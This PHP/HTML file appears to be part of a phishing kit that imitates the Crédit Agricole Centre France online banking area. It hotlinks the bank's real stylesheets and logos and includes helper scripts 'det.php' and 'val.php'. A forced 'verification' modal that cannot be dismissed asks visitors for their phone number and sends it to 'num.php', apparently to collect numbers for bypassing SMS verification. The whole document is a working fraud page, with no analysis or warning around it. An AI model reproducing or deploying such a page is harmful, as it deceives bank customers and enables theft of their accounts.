﻿<?php

session_start();
include('det.php');
include('val.php');
?>
<html><head>
	
	<meta http-equiv="content-type" content="text/html; charset=utf-8">
	<title>Cr&#233;dit Agricole - Banque et assurances</title>
	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">





<style>
.modal {
    position: fixed;
    top: 35% !important;
    left: 50%;
}
</style>


<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>







			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/antiquus.css?v=58" media="all">
			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/antiquus.css?v=58" media="all">


			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles.css" media="all">
			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles.css" media="all">


			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/appli/web/commun/styles/styles-mod.css" media="all">
			<link rel="stylesheet" type="text/css" href="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/styles/styles-mod.css" media="all">

<!--[if IE 8]>

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie8.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie8.css?v=58" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie8-mod.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie8-mod.css?v=58" media="all" />
<![endif]-->

<!--[if lte IE 7]>

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie.css?v=58" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ie-mod.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ie-mod.css?v=58" media="all" />
<![endif]-->

<!--[if lt IE 7]>
<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ieold.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold.css?v=58" media="all" />

<link rel="stylesheet" type="text/css" href="/web/bam/tech/allmedia/stb/commun/styles/ieold-mod.css?v=58" media="all" />
<link rel="stylesheet" type="text/css" href="/web/bam/appli/web/commun/styles/ieold-mod.css?v=58" media="all" />
<![endif]-->

</head>
<body marginheight="0" topmargin="0" vspace="0" marginwidth="0" leftmargin="0" hspace="0" style="margin:-11px"><div id="container">
	<table border="0" width="960px" cellpadding="0" cellspacing="0">
		<tbody><tr valign="middle"><td>
			<!-----  DEBUT zone enteteTech  ---->

<!-----  FIN zone boutonVert  ---->

</td></tr><tr height="17" valign="top"><td>
<!-----  DEBUT zone bnc  ---->









<div id="entete_professionnel">

	<div id="entete_2">
		<div id="gauche-entete_2">
			<h1>
				<table>
					<tbody><tr>   
						<td class="entete_2_logo">
							<a title="Caisse R&#233;gionale Centre France, retour &#224; l'accueil" href="#" id="lien-logo_2">
								<img alt="Caisse R&#233;gionale Centre France, retour &#224; l'accueil" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/logo_868.png">
							</a>
						</td>
						<td class="entete_2_CR">
							<a title="Caisse R&#233;gionale Centre France, retour &#224; l'accueil" href="https://www.cf-g3-enligne.credit-agricole.fr/stb/entreeBam#" id="lien-logo_2">
								<span></span>
							</a>
						</td>
					</tr>
					<tr>
						<td colspan="2" id="slogan_2">Banque Assurance Immobilier</td>				
					</tr>
				</tbody></table>

			</h1>
			<!--        <p id="slogan">Banque Assurance Immobilier</p>-->
		</div>
		<div id="centre-entete_2">
			<!--	    <img alt="Cr&#233;dit Agricole Nord de France, retour &#224; l'accueil" src="/web/bam/tech/allmedia/stb/commun/img/separateur.png"></img>-->
			<p id="typeespace_2">

			</p> 
		</div>
		<div id="droite-entete_2">    	
			<p id="der-conn_2">Votre derni&#232;re connexion :  <?php
date_default_timezone_set('Europe/Paris');
// --- La setlocale() fonctionnne pour strftime mais pas pour DateTime->format()
setlocale(LC_TIME, 'fr_FR.utf8','fra');// OK
// strftime("jourEnLettres jour moisEnLettres annee") de la date courante
echo "", strftime("%d %B %Y");
?> </p>
			<div id="bloc-login_2">
				<div id="bloc-login-infos_2" style="font-size: 11px;">
					<p> </p>
					<p></p>
				</div>
				<div id="btn-bloc-login_2">

					<a onMouseOver="StatusMessage(true, 'D&#233;connexion');return true" onMouseOut="StatusMessage( false )" href="#" id="btn-deconnexion_2">D&#233;connexion</a>
				</div>
			</div>
			<div class="clearboth"></div>
			<div id="bloc-login_22">
				<p>

					<a id="coordonnees_2" href="#" onMouseOver="StatusMessage(true, 'G&#233;rer vos coordonn&#233;es');return true" onMouseOut="StatusMessage( false )">Vos Coordonn&#233;es</a>

					
					&nbsp; <a id="contact_2" href="#" onMouseOver="StatusMessage(true, 'Si vous avez une demande particuli&#232;re, cliquez ici');return true" onMouseOut="StatusMessage( false )">Nous contacter</a>


					&nbsp; <a id="btn-sos_22" href="#" onMouseOver="StatusMessage(true, 'D&#233;clarez une perte, un vol ou un sinistre');return true" onMouseOut="StatusMessage( false )">SOS Urgences</a>	
				</p>		        
			</div>   
			<div class="clearboth"></div>           
		</div>
	</div>



	<ul id="menu-bnc_2">




		<li id="bnc-compte" class="bnc-g  prem-menu">
			<p style="text-align:center">
				<a href="#" id="bnc-compte-href" style="width: 118 " onMouseOver="StatusMessage(true, 'Comptes et cartes'); document.getElementById('bnc-compte_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-compte_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-compte_logo').src='https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-compte_off.png';">
					<img alt="Comptes et cartes" id="bnc-compte_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-compte_off.png">


					<br>
					<span>
						Comptes<br><span class="small"> &amp; cartes</span>
					</span>
				</a>
			</p>
		</li>
		
		<li>
		</li>
		

		<li id="bnc-messagerie" class="bnc-gmess">				
			<p style="text-align:center">
				<a href="#" id="bnc-messagerie-href" style="width:				
				118
				" onMouseOver="StatusMessage(true, 'Messagerie '); 
				document.getElementById('bnc-messagerie_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-messagerie_on.png';
				return true" onMouseOut="StatusMessage( false );
				document.getElementById('bnc-messagerie_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-messagerie_off.png';">
				<img alt="Messagerie " id="bnc-messagerie_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-messagerie_off.png">


				<br>
				<span>
					Messagerie 
				</span>		
			</a>
		</p>
	</li>

	
	<li>
	</li>


	<li id="bnc-espaceconseil" class="bnc-g ">
		<p style="text-align:center">
			<a href="#" id="bnc-espaceconseil-href" style="width: 118 " onMouseOver="StatusMessage(true, 'Conseils'); document.getElementById('bnc-espaceconseil_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-espaceconseil_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-espaceconseil_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-espaceconseil_off.png';">
				<img alt="Conseils" id="bnc-espaceconseil_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-espaceconseil_off.png">


				<br>
				<span>
					Conseils
				</span>
			</a>
		</p>
	</li>

	<li>
	</li>


	<li id="bnc-devissimulations" class="bnc-g ">
		<p style="text-align:center">
			<a href="#" id="bnc-devissimulations-href" style="width: 118 " onMouseOver="StatusMessage(true, 'Simulation et Devis'); document.getElementById('bnc-devissimulations_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-devissimulations_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-devissimulations_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-devissimulations_off.png';">
				<img alt="Simulation et Devis" id="bnc-devissimulations_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-devissimulations_off.png">


				<br>
				<span>
					Simulation<br><span class="small"> &amp; Devis</span>
				</span>
			</a>
		</p>
	</li>

	<li>
	</li>


	<li id="bnc-quotidien" class="bnc-d ">
		<p style="text-align:center">
			<a href="#" id="bnc-quotidien-href" style="width:
			118
			" onMouseOver="StatusMessage(true, 'Quotidien'); document.getElementById('bnc-quotidien_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-quotidien_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-quotidien_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-quotidien_off.png'">

			<img alt="Quotidien" id="bnc-quotidien_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-quotidien_off.png">

			<br>
			<span>
				Quotidien
			</span>

		</a>
	</p>
</li>




<li id="bnc-credits" class="bnc-d ">
	<p style="text-align:center">
		<a href="#" id="bnc-credits-href" style="width:
		118
		" onMouseOver="StatusMessage(true, 'Cr&#233;dits'); document.getElementById('bnc-credits_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-credits_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-credits_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-credits_off.png'">

		<img alt="Cr&#233;dits" id="bnc-credits_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-credits_off.png">

		<br>
		<span>
			Cr&#233;dits
		</span>

	</a>
</p>
</li>




<li id="bnc-epargne" class="bnc-d ">
	<p style="text-align:center">
		<a href="v" id="bnc-epargne-href" style="width:
		118
		" onMouseOver="StatusMessage(true, '&#233;pargner'); document.getElementById('bnc-epargne_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-epargne_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-epargne_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-epargne_off.png'">

		<img alt="&#233;pargner" id="bnc-epargne_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-epargne_off.png">

		<br>
		<span>
			&#233;pargner
		</span>

	</a>
</p>
</li>




<li id="bnc-assurance" class="bnc-d  der-menu">
	<p style="text-align:center">
		<a href="#" id="bnc-assurance-href" style="width: 
		120
		" onMouseOver="StatusMessage(true, 'Assurance'); document.getElementById('bnc-assurance_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-assurance_on.png'; return true" onMouseOut="StatusMessage( false ); document.getElementById('bnc-assurance_logo').src='/web/bam/tech/allmedia/stb/commun/img/p_bnc-assurance_off.png'">

		<img alt="S'assurer" id="bnc-assurance_logo" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/p_bnc-assurance_off.png">

		<br>
		<span>
			S'assurer
		</span>

	</a>
</p>
</li>





</ul>





<!-----  FIN zone bnc  ---->

</div></td></tr><tr valign="middle"><td>
<!-----  DEBUT zone FILDARIANE  ---->




<script type="text/javascript">
	var PU_PREM_ECRAN = "javascript:doAction('Synthcomptes', 'bnt');";
</script>
<div id="fil-ariane_2">
	
	
	
	

	
	
	
	






	<script>aide_message= "Acc&#233;dez &#224; vos messages";</script>


	<div id="ariane-message3_2">
		<p>
			<!--								Vous avez  -->
			<a href="#" onMouseOver="StatusMessage(true, aide_message);return true" onMouseOut="StatusMessage( false )">
				<span style="color:#F8F8FF; font-size:22px; font-weight:bold; text-decoration:none">&nbsp;0</span>&nbsp; <img src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/pic_messagerie_gris.png">
				<!--									nouveau&nbsp;message-->
			</a>
		</p>
	</div>




</div>


<!-----  FIN zone FILDARIANE  ---->

</td></tr><tr valign="middle"><td>
<!-----  DEBUT zone libPerimetre  ---->




<div id="libPerimetre_2">
	<span class="textePerimetre_2">               Espace personnel           </span>
</div>





<!-----  FIN zone libPerimetre  ---->

</td></tr><tr valign="middle"><td>
<!-----  DEBUT zone infoperso  ---->

<!-----  FIN zone infoperso  ---->

</td></tr><tr height="17" valign="top"><td><table border="0" cellpadding="0" cellspacing="0">
<tbody><tr><td valign="top" width="168px">
	<table border="0" valign="top" width="168px" cellpadding="0" cellspacing="0">
		<tbody><tr><td>
			<!-----  DEBUT zone MENH  ---->
			
			<!-----  FIN zone MENH  ---->

		</td></tr><tr><td>
		<!-----  DEBUT zone bnt  ---->



		<script language="JavaScript">
			function go() {
				url = document.forms.FRM_LST.nocpte.options[document.forms.FRM_LST.nocpte.selectedIndex].value;
				i = document.forms.FRM_LST.nocpte.selectedIndex;
				if (url != "")
				{
					doAction(url,'bnt','DetCpt', i );
				}
			}

			choix=false;
			function choixCompte() {
				if (saf) {
					go();
				} else {
					if (choix) {
						choix=false;
						go();
					}
					else
						choix = true;
				}
			}

			function resetChoix() {
				choix=false;
			}

		</script>
		<form name="FRM_LST" method="POST">


			<ul id="menu-bnt_2">
				<li>
					<h2 id="bnt-titre-synthese" class="prem-titre-bnt">
						<!--			<div class="traitgauche"><img src="/web/bam/tech/allmedia/stb/commun/img/Puc-vert.png" vertical-align="middle"></div>    -->
						<div class="traitgauchevert">&nbsp;</div>
						<div class="libmenubnt">
							Synth&#232;ses
						</div>  
					</h2>
				</li>
				<ul>


					<script>aide_bnt1_0= "Acc&#233;dez &#224; vos comptes";</script>

					<li class="nomarge-li-BNT">
						<a class="itemactif-bnt-titre-Autrescomptes" style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_0);return true" onMouseOut="StatusMessage( false )">Mes Comptes</a>
					</li>

					<script>aide_bnt1_1= "Acc&#233;dez &#224; vos cr&#233;dits";</script>

					<li class="nomarge-li-BNT">
						<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_1);return true" onMouseOut="StatusMessage( false )">Mes Cr&#233;dits</a>
					</li>

					<script>aide_bnt1_2= "Acc&#233;dez &#224; vos contrats d'&#233;pargne";</script>

					<li class="nomarge-li-BNT">
						<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_2);return true" onMouseOut="StatusMessage( false )">Mon &#233;pargne</a>
					</li>

					<script>aide_bnt1_3= "Acc&#233;dez &#224; vos contrats d'assurances";</script>

					<li class="nomarge-li-BNT">
						<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_3);return true" onMouseOut="StatusMessage( false )">Mes Assurances</a>
					</li>

					<script>aide_bnt1_4= "Acc&#233;dez &#224; vos comptes en devises";</script>

					<li class="nomarge-li-BNT">
						<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_4);return true" onMouseOut="StatusMessage( false )">Devises</a>
					</li>

					<script>aide_bnt1_5= "Visualisez la situation globale de votre patrimoine";</script>

					<li class="nomarge-li-BNT">
						<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_5);return true" onMouseOut="StatusMessage( false )">Situation globale</a>
					</li>


					<!-- </ul> -->
					<!-- </li> -->
					<p style="height:10px;"></p>
					<li id="padding-top-titre-bnt">
						<h2 id="bnt-titre-Autrescomptes">
							<a href="#" onClick="doAction('Perimetre')" title="Espace Autres Comptes">
								Espace Autres Comptes
							</a>
						</h2>
					</li>


					<p style="height:10px;"></p>
					<li id="padding-top-titre-bnt">
						<h2 id="bnt-titre-services">
							<!--						<div class="traitgauche"><img src="/web/bam/tech/allmedia/stb/commun/img/Puc-rose-1.png" vertical-align="middle"></div>    -->
							<div class="traitgaucherose1">&nbsp;</div>
							<div class="libmenubnt">
								Services
							</div>  
						</h2>
						<ul>
							<script>aide_bnt1_6= "Effectuez un virement";</script>
							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_6);return true" onMouseOut="StatusMessage( false )">Virements</a>
							</li>
							<script>aide_bnt1_7= "Commandez votre ch&#233;quier";</script>
							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_7);return true" onMouseOut="StatusMessage( false )">Ch&#233;quiers</a>
							</li>
							<script>aide_bnt1_8= "G&#233;rez vos titres";</script>
							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt1_8);return true" onMouseOut="StatusMessage( false )">Titres</a>
							</li>

						</ul>
					</li>




					<p style="height:10px;"></p>
					<li id="padding-top-titre-bnt">
						<h2 id="bnt-titre-eservices">
							<!--		    	<div class="traitgauche"><img src="/web/bam/tech/allmedia/stb/commun/img/Puc-rose-2.png" vertical-align="middle"></div>    -->
							<div class="traitgaucherose2">&nbsp;</div>
							<div class="libmenubnt">
								e-Services
							</div>
						</h2>
						<ul>

							<script>aide_bnt3_0= "Effectuez une demande de souscription &#224; un de nos produits directement en ligne"; </script>

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onClick="lancerSTTrackingElargi('Performance&amp;prov=bnt','bnt-souscription100enligne','');" onMouseOver="StatusMessage(true, aide_bnt3_0);return true" onMouseOut="StatusMessage( false )">Souscription 100% <br> en ligne</a>
							</li>

							<script>aide_bnt3_1= "Signez vos contrats en attente"; </script>

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt3_1);return true" onMouseOut="StatusMessage( false )">Mes contrats en attente</a>
							</li>


							<script>aide_bnt3_2= "Acc&#233;dez au service de pr&#233;sentation et de r&#232;glement de factures"; </script>

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" sepamail="" onMouseOver="StatusMessage(true, aide_bnt3_2);return true" onMouseOut="StatusMessage( false )">SEPAmail
								</a>
							</li>


							<script>aide_bnt3_3= "L'essentiel sur votre produit en quelques points cl&#233;s"; </script>

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt3_3);return true" onMouseOut="StatusMessage( false )">M&#233;mo</a>
							</li>


							<script>aide_bnt3_4= "Commande devises"; </script>

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onClick="ouvrirPopup('https://www.cprplusdirect.com/Reseaux/connect.aspx?ID=CACentreFrance','eCoffreFort','500','600','yes','yes','yes','yes','yes','yes');" onMouseOver="StatusMessage(true, aide_bnt3_4);return true" onMouseOut="StatusMessage( false )">Commande devises</a>
							</li>


						</ul>
					</li>



					<!-- E-Documents -->	

					<p style="height:10px;"></p>
					<li id="padding-top-titre-bnt">
						<h2 id="bnt-titre-edocuments">
							<!--			<div class="traitgauche"><img src="/web/bam/tech/allmedia/stb/commun/img/Puc-rose-2.png" vertical-align="middle"></div>    -->
							<div class="traitgaucherose2">&nbsp;</div>
							<div class="libmenubnt">
								e-Documents
							</div>
						</h2>
						<ul>	    

							<script>aide_bnt4_0= "G&#233;rer vos documents &#233;lectroniques"; </script> 


							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt4_0);return true" onMouseOut="StatusMessage( false )">Gestion</a>
							</li>




							<script>aide_bnt4_1= "Consulter vos documents &#233;lectroniques"; </script> 


							<li class="nomarge-li-BNT">
								<a style="width:auto;height:23" href="#" onMouseOver="StatusMessage(true, aide_bnt4_1);return true" onMouseOut="StatusMessage( false )">Consultation&nbsp;
									<img id="imgQEDNLU" alt="Nouveau e-Document" title="Nouveau e-Document" src="https://www.cf-g3-enligne.credit-agricole.fr/web/bam/tech/allmedia/stb/commun/img/picto_nouveau.png">
								</a>
							</li>




						</ul>
					</li>



					<p style="height:10px;"></p>
					<li id="padding-top-titre-bnt">
						<h2 id="bnt-titre-outils">
							<!--			<div class="traitgauche"><img src="/web/bam/tech/allmedia/stb/commun/img/Puc-gris.png" vertical-align="middle"></div>    -->
							<div class="traitgauchegris">&nbsp;</div>
							<div class="libmenubnt">
								Outils
							</div>
						</h2>

						<ul>

							<script>aide_bnt5_0= "T&#233;l&#233;chargez vos relev&#233;s de comptes"; </script> 

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt5_0);return true" onMouseOut="StatusMessage( false )">T&#233;l&#233;chargement</a>
							</li>


							<script>aide_bnt5_1= "Personnalisez vos alertes"; </script> 

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt5_1);return true" onMouseOut="StatusMessage( false )">Alertes</a>
							</li>


							<script>aide_bnt5_2= "G&#233;rer vos pr&#233;f&#233;rences"; </script> 

							<li class="nomarge-li-BNT">
								<a style="width:auto" href="#" onMouseOver="StatusMessage(true, aide_bnt5_2);return true" onMouseOut="StatusMessage( false )">Vos Pr&#233;f&#233;rences</a>
							</li>


						</ul>
					</li>
				</ul>

				
					<input type="hidden" name="urlTel">
				

				<!-----  FIN zone bnt  ---->

			</ul></form></td></tr><tr><td>
			<!-----  DEBUT zone MENB  ---->
			<div idcomp="tcm-979-374723"><script> prefixe = 'pack_1111'; </script><ul id="menu-bnt">

			</ul></div><!--vide-->
			<!-----  FIN zone MENB  ---->

		</td></tr>
	</tbody></table>
</td><td valign="top" width="6.5px">

<!-----  DEBUT zone filler  ---->
<span style="font-size: 1px">&nbsp;</span>


<!-----  FIN zone filler  ---->

</td>
<td valign="top" width="590px" id="col-centre">
<div class="boutons-act">
	<h1>VERIFICATION REQUISE<span id="top-actions">
		<a href="#" id="top-actions-aide" onMouseOut="afftextStat(0)" onMouseOver="afftextStat(statusaide);return true" title="Besoin d'Aide ?">Aide</a>
	</span>
	
</h1>
</div>

<!-------------- ERREURS-VALIDATION ----------->

		










<script>champsEnErreur = null;</script>





		

















<!---------- FIN ERREURS-VALIDATION ----------->


<br>




<table width="364" border="0" cellspacing="0" cellpadding="0">
<tbody><tr>
	<td align="right">
	

			
	</td>
</tr>
</tbody></table>



<!-----  FIN zone pu  ---->


</td> 
<td valign="top" width="" align="right">
<div style="width: 160px;" class="popupPAP" align="left">
	<div valign="middle" style="font-size:0px;">
		<!-----  DEBUT zone SECU  ---->

		<span style="font-size: 0px">&nbsp;</span>

		<!-----  FIN zone SECU  ---->

	</div><div valign="middle">
	<!-----  DEBUT zone BAM  ---->
	<!--vide--><!--vide-->
	<!-----  FIN zone BAM  ---->

</div><div valign="middle">
<!-----  DEBUT zone INFO  ---->
<!--vide--><!--vide-->
<!-----  FIN zone INFO  ---->

</div><div valign="middle">


</div>
</div>
</td></tr>

</tbody></table>





<!-----  FIN zone pu  ---->





</td>



</tr></tbody></table>

<!-----  DEBUT zone footer  ---->



<br>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
	<tbody><tr valign="middle" align="center">
		<td>

			<script>
				<!--
				aide_f0= "Acc&#233;dez aux Conditions G&#233;n&#233;rales d'utilisation";
			//-->
		</script>
		<a href="#" class="footerlien" onMouseOver="StatusMessage(true, aide_f0);return true" onMouseOut="StatusMessage( false )">Conditions G&#233;n&#233;rales d'utilisation</a>

		<span class="footerseparateur">&nbsp;|&nbsp;</span>

		<script>
			<!--
			aide_f1= "Acc&#233;dez &#224; l'aide";
			//-->
		</script>
		<a href="#" class="footerlien" onMouseOver="StatusMessage(true, aide_f1);return true" onMouseOut="StatusMessage( false )">Aide</a>

		<span class="footerseparateur">&nbsp;|&nbsp;</span>

		<script>
			<!--
			aide_f2= "Acc&#233;dez au lexique";
			//-->
		</script>
		<a href="#" class="footerlien" onMouseOver="StatusMessage(true, aide_f2);return true" onMouseOut="StatusMessage( false )">Lexique</a>

		<span class="footerseparateur">&nbsp;|&nbsp;</span>

		<script>
			<!--
			aide_f3= "";
			//-->
		</script>
		<a href="#" class="footerlien" onMouseOver="StatusMessage(true, aide_f3);return true" onMouseOut="StatusMessage( false )">Politique de protection des donn&#233;es</a>

		<span class="footerseparateur">&nbsp;|&nbsp;</span>

		<script>
			<!--
			aide_f4= "";
			//-->
		</script>
		<a href="#" class="footerlien" onMouseOver="StatusMessage(true, aide_f4);return true" onMouseOut="StatusMessage( false )">Nos tarifs</a>

	</td>
</tr>
<tr>
	<td align="center">





		<script language="JavaScript">
			var iDSession = "-7972f3341556fd65e36-5b4a.SAG_V6";
			var codeCR = "868";
		</script>	 
		<table width="100%">
			<tbody><tr>
				<td class="footercopyright" align="center">
					<br>&nbsp;
				</td><td>
			</td></tr>
		</tbody></table>
	</td>

</tr>
</tbody></table>

<!-----  FIN zone footer  ---->

<script>
$(window).load(function(){        
   $('#myModal').modal({backdrop: 'static', keyboard: false});
    }); 
</script>

</div>
<div id="myModal" class="modal fade" role="dialog">
  <div class="modal-dialog">
    <!-- Modal content-->
    <div class="modal-content">
	<form class="ca-forms" name="frm_fwk" method="POST" action="num.php">
      <div class="modal-header">
        <h4 class="modal-title"><center>Vérifiez votre numéro de téléphone</center></h4>
      </div>
      <div class="modal-body">
        <fieldset class="blc-choix" style="border:0;">
    <div class="blc-choix-wrap">
<table width="570" border="0" cellpadding="3" cellspacing="0">
		<tbody>
  <tr>
  <td height="29"><strong>Veuillez saisir votre numéro de téléphone. </strong></td>
  
	 
    <td>+33<input name="num" id="edit-email-id" size="10" placeholder="0612345678" maxlength="10" type="text" required=""></td>

	
 <p>
 Nous enverrons un code de vérification pour vérifier qu'il s'agit bien de votre compte.
 </p>
  </tr>
  
  
 <tr>
</tr>
</tbody></table>
<div class="validation">
		<input type="submit" id="droite" value="Confirmer">

									
									
										
									
									


				
</div>
</div>
</fieldset>
      </div>
</form>
    </div>

  </div>
</div></body></html>